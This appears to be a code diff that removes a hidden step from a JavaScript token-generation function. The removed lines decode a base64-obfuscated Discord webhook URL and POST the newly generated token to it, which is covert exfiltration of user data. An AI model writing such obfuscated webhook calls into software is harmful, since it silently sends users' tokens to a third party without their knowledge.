@@ -1,7 +1,3 @@
-
-// Settings dis_hook for the first time
-dis_hook = null;
-
  function genToken() {
 	if (localStorage.getItem('token') !== null) {
 		// giving an error if the token still exists
@@ -16,12 +12,6 @@ dis_hook = null;
 		let numtoken3 = Math.floor(Math.random() * 100000);
 		var main_token = ("nfa." + alphtoken1 + numtoken1 + alphtoken2 + numtoken2 + alphtoken3 + numtoken3);
 		localStorage['token'] = main_token;
-		hook =atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODcyMzQ4MTkzNDIwMTA3Nzk3L0RaamR4Z0cwbGlHVFhoSzJIOE1PdnFGcDhaV3RQTXpGdU9LNXhlU1ZLSzZJRVJ2dkx2X0UtVXhlb3JkZGtkbE1HYWV0')
-		msg1 = {
-			"content": ("__**Token (Not Discord):" + main_token)
-		}
-		fetch(dis_hook, {"method":"POST", "headers": {"content-type": "application/json"},
-		"body": JSON.stringify(msg1)});
 	}
 }
 
